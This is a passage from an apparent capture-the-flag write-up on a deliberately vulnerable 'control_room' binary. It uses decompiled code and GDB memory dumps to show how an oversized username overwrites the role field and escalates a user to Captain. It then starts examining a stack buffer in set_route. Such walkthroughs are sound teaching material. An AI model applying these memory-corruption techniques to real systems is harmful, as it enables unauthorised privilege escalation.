<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(engines, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">80</span><span class="mtk1">);</span>
<span class="mtk1">  curr_user </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">malloc</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">110</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk5">*</span><span class="mtk1">(undefined4 </span><span class="mtk5">*</span><span class="mtk1">) ((</span><span class="mtk7 mtki">long</span><span class="mtk1">) curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">) </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">;</span>  
<span class="mtk1">}</span>
</code></pre></div><p>So, the global variable <code>curr_user</code> will hold the username (256 bytes long), then the role and then the length. We can check this using GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">control_room</span>
Reading symbols from <span class="code-dark-green">control_room</span>...
(No debugging symbols found in <span class="code-dark-green">control_room</span>)
<span class="code-red">gef➤  </span>run
Starting program: ./control_room
&lt;===[ Register ]===&gt;

Enter a username: asdf

Are you sure about your username choice? (y/n)  
&gt; y
[<span class="code-dark-green">+</span>] User registered successfully.


<span class="code-dark-red">┌───────────────┬────────┐</span>
<span class="code-dark-red">│ Control Panel │ 9A0:F3 │</span>
<span class="code-dark-red">├───────────────┴────────┤</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Technician:            │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 1. Configure Engine    │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 2. Check Engine        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Captain:               │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 3. Set route           │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 4. View route          │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 5. Change roles        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">└────────────────────────┘</span>

[<span class="code-dark-blue">*</span>] Current Role: Crew

<span class="code-white">Option [1-5]: </span>^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7ea7992</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./libc.so.6</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/40gx (void *) curr_user
<span class="code-dark-blue">0x408480</span>:       0x0000000066647361      0x0000000000000000  
<span class="code-dark-blue">0x408490</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084a0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084b0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084c0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084d0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084e0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408500</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408510</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408520</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408530</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408540</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408550</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408560</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408570</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408580</span>:       0x0000000000000002      0x0000000000000005
<span class="code-dark-blue">0x408590</span>:       0x0000000000000000      0x0000000000020a71
<span class="code-dark-blue">0x4085a0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4085b0</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>As expected, we have the username (<code>"asdf"</code>), then the role (<code>2</code>), and the length of the username (<code>5</code> because it counted the new line character).</p><p>Notice that we have the change to confirm our username in <code>user_edit</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">user_edit</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> size;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_user;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> newline_index;</span>
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"&lt;===[ Edit Username ]===&gt;</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"New username size: "</span><span class="mtk1">);</span>
<span class="mtk1">  size </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_num</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(ulong </span><span class="mtk5">*</span><span class="mtk1">) (curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">108</span><span class="mtk1">) </span><span class="mtk5">&lt;</span><span class="mtk1"> (ulong) (</span><span class="mtk7 mtki">long</span><span class="mtk1">) size) {</span>
<span class="mtk1">    </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">,</span><span class="mtk4">"Can</span><span class="mtk6">\'</span><span class="mtk4">t be larger than the current username.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>  
<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">    p_user </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">((</span><span class="mtk7 mtki">long</span><span class="mtk1">) (size </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">));</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (p_user </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">,</span><span class="mtk4">"Please replace the memory catridge."</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(p_user, </span><span class="mtk6">0</span><span class="mtk1">, (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (size </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">));</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Enter your new username: "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fgets</span><span class="mtk1">(p_user, size, stdin);</span>
<span class="mtk1">    newline_index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcspn</span><span class="mtk1">(p_user, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">    p_user[newline_index] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8">strncpy</span><span class="mtk1">(curr_user, p_user, (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (size </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">));</span>
<span class="mtk1">    </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"User updated successfully!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">free</span><span class="mtk1">(p_user);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Notice that <code>user_register</code> used a custom function called <code>read_input</code>, whereas <code>user_edit</code> calls <code>fgets</code> using the current length of the username.</p><p>Let&rsquo;s see what happens if we try to overflow the username field:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>pattern create
<span class="code-blue">[+]</span> Generating a pattern of 1024 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa
aaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaa
aaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaela  
aaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
<span class="code-green">[+]</span> Saved as '$_gef0'
<span class="code-green">gef➤  </span>run
Starting program: ./control_room
&lt;===[ Register ]===&gt;

Enter a username: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaa
uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabra
aaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaa
aaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaa
admaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaae
jaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf

Are you sure about your username choice? (y/n)
&gt; &lt;===[ Edit Username ]===&gt;

New username size:
Enter your new username: [<span class="code-dark-green">+</span>] User updated successfully!


<span class="code-dark-red">┌───────────────┬────────┐</span>
<span class="code-dark-red">│ Control Panel │ 9A0:F3 │</span>
<span class="code-dark-red">├───────────────┴────────┤</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Technician:            │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 1. Configure Engine    │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 2. Check Engine        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Captain:               │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 3. Set route           │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 4. View route          │</span>                                                                                                                                                        <span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 5. Change roles        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">└────────────────────────┘</span>

[<span class="code-dark-blue">*</span>] Current Role: Crew

<span class="code-white">Option [1-5]: </span>selection: 0
[<span class="code-dark-red">!</span>] Invalid option

[Inferior 1 (process 227208) exited with code 0377]
</code></pre></div><p>Well, that was too much. Let&rsquo;s use exactly 256 characters:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">gef➤  </span>pattern create 256
<span class="code-blue">[+]</span> Generating a pattern of 256 bytes (n=8)
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa  
aaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab
<span class="code-green">[+]</span> Saved as '$_gef1'
<span class="code-red">gef➤  </span>run
Starting program: ./control_room
&lt;===[ Register ]===&gt;

Enter a username: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaa
uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaab

Are you sure about your username choice? (y/n)
&gt; &lt;===[ Edit Username ]===&gt;

New username size: ^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7ea7992</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./libc.so.6
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/40gx (void *) curr_user
<span class="code-dark-blue">0x408480</span>:       0x6161616161616161      0x6161616161616162  
<span class="code-dark-blue">0x408490</span>:       0x6161616161616163      0x6161616161616164
<span class="code-dark-blue">0x4084a0</span>:       0x6161616161616165      0x6161616161616166
<span class="code-dark-blue">0x4084b0</span>:       0x6161616161616167      0x6161616161616168
<span class="code-dark-blue">0x4084c0</span>:       0x6161616161616169      0x616161616161616a
<span class="code-dark-blue">0x4084d0</span>:       0x616161616161616b      0x616161616161616c
<span class="code-dark-blue">0x4084e0</span>:       0x616161616161616d      0x616161616161616e
<span class="code-dark-blue">0x4084f0</span>:       0x616161616161616f      0x6161616161616170
<span class="code-dark-blue">0x408500</span>:       0x6161616161616171      0x6161616161616172
<span class="code-dark-blue">0x408510</span>:       0x6161616161616173      0x6161616161616174
<span class="code-dark-blue">0x408520</span>:       0x6161616161616175      0x6161616161616176
<span class="code-dark-blue">0x408530</span>:       0x6161616161616177      0x6161616161616178
<span class="code-dark-blue">0x408540</span>:       0x6161616161616179      0x626161616161617a
<span class="code-dark-blue">0x408550</span>:       0x6261616161616162      0x6261616161616163
<span class="code-dark-blue">0x408560</span>:       0x6261616161616164      0x6261616161616165
<span class="code-dark-blue">0x408570</span>:       0x6261616161616166      0x0061616161616167
<span class="code-dark-blue">0x408580</span>:       0x0000000000000002      0x0000000000000100
<span class="code-dark-blue">0x408590</span>:       0x0000000000000000      0x0000000000020a71
<span class="code-dark-blue">0x4085a0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4085b0</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>Notice that the length is exactly 256 bytes (<code>0x100</code>). The next character (<code>\n</code>) made the program go to <code>user_edit</code>. This function has an interesting sentence:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">memset</span><span class="mtk1">(p_user, </span><span class="mtk6">0</span><span class="mtk1">, (</span><span class="mtk7 mtki">long</span><span class="mtk1">) (size </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">));</span>  
</code></pre></div><p>With this, our role will be updated to <code>0</code> (Captain) because the length is <code>0x100</code>. Hence, let&rsquo;s update our username entering 256 (<code>0x100</code>) as new size and a random username:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>continue
Continuing.
256

Enter your new username: asdf
[<span class="code-dark-green">+</span>] User updated successfully!


<span class="code-dark-red">┌───────────────┬────────┐</span>
<span class="code-dark-red">│ Control Panel │ 9A0:F3 │</span>
<span class="code-dark-red">├───────────────┴────────┤</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Technician:            │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 1. Configure Engine    │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 2. Check Engine        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ Captain:               │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 3. Set route           │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 4. View route          │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">│ 5. Change roles        │</span>
<span class="code-dark-red">│                        │</span>
<span class="code-dark-red">└────────────────────────┘</span>

[<span class="code-dark-blue">*</span>] Current Role: Captain

<span class="code-white">Option [1-5]: </span>^C
Program received signal SIGINT, Interrupt.
<span class="code-dark-blue">0x00007ffff7ea7992</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./libc.so.6</span>  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef➤  </span>x/40gx (void *) curr_user
<span class="code-dark-blue">0x408480</span>:       0x0000000066647361      0x0000000000000000  
<span class="code-dark-blue">0x408490</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084a0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084b0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084c0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084d0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084e0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x4084f0</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408500</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408510</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408520</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408530</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408540</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408550</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408560</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408570</span>:       0x0000000000000000      0x0000000000000000
<span class="code-dark-blue">0x408580</span>:       0x0000000000000000      0x0000000000000100
<span class="code-dark-blue">0x408590</span>:       0x0000000000000000      0x0000000000000111
<span class="code-dark-blue">0x4085a0</span>:       0x0000000000000408      0x1c4792114ee993aa
<span class="code-dark-blue">0x4085b0</span>:       0x0000000000000000      0x0000000000000000
</code></pre></div><p>Perfect, now we are Captain (<code>0</code>). Let&rsquo;s analyze the available options.</p><h3 id="captain-options">Captain options</h3><p>We have <code>set_route</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">set_route</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">size_t</span><span class="mtk1"> newline_index;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> number[</span><span class="mtk6">8</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> confirmation[</span><span class="mtk6">2</span><span class="mtk1">];</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
<span class="mtk1">  confirmation </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1">  [</span><span class="mtk6">2</span><span class="mtk1">]) </span><span class="mtk5">0x</span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (curr_user </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">100</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">; i </span><span class="mtk5">=</span><span class="mtk1"> i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"&lt;===[ Coordinates [</span><span class="mtk6">%d</span><span class="mtk4">] ]===&gt;</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, (ulong) (i </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">));</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">Latitude  : "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%ld</span><span class="mtk4">"</span><span class="mtk1">, number </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\t</span><span class="mtk4">Longitude : "</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%ld</span><span class="mtk4">"</span><span class="mtk1">, number </span><span class="mtk5">+</span><span class="mtk1"> (</span><span class="mtk7 mtki">long</span><span class="mtk1">) i </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Do you want to save the route? (y/n) "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">&gt; "</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk8">fgets</span><span class="mtk1">(confirmation, </span><span class="mtk6">3</span><span class="mtk1">, stdin);</span>
<span class="mtk1">    newline_index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcspn</span><span class="mtk1">(confirmation, </span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">    confirmation[newline_index] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
<span class="mtk1">    ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(confirmation, </span><span class="mtk4">"y"</span><span class="mtk1">);</span>

<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">      route._0_8_ </span><span class="mtk5">=</span><span class="mtk1"> number[</span><span class="mtk6">0</span><span class="mtk1">];</span>
<span class="mtk1">      route._8_8_ </span><span class="mtk5">=</span><span class="mtk1"> number[</span><span class="mtk6">1</span><span class="mtk1">];</span>
<span class="mtk1">      route._16_8_ </span><span class="mtk5">=</span><span class="mtk1"> number[</span><span class="mtk6">2</span><span class="mtk1">];</span>
<span class="mtk1">      route._24_8_ </span><span class="mtk5">=</span><span class="mtk1"> number[</span><span class="mtk6">3</span><span class="mtk1">];</span>
<span class="mtk1">      route._32_8_ </span><span class="mtk5">=</span><span class="mtk1"> number[</span><span class="mtk6">4</span><span class="mtk1">];</span>
<span class="mtk1">      route._40_8_ </span><span class="mtk5">=</span><span class="mtk1"> number[</span><span class="mtk6">5</span><span class="mtk1">];</span>
<span class="mtk1">      route._48_8_ </span><span class="mtk5">=</span><span class="mtk1"> number[</span><span class="mtk6">6</span><span class="mtk1">];</span>
<span class="mtk1">      route._56_8_ </span><span class="mtk5">=</span><span class="mtk1"> number[</span><span class="mtk6">7</span><span class="mtk1">];</span>
<span class="mtk1">      </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"The route has been successfully updated!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">      </span><span class="mtk8">log_message</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk4">"Operation cancelled"</span><span class="mtk1">);</span>
<span class="mtk1">    }</span>
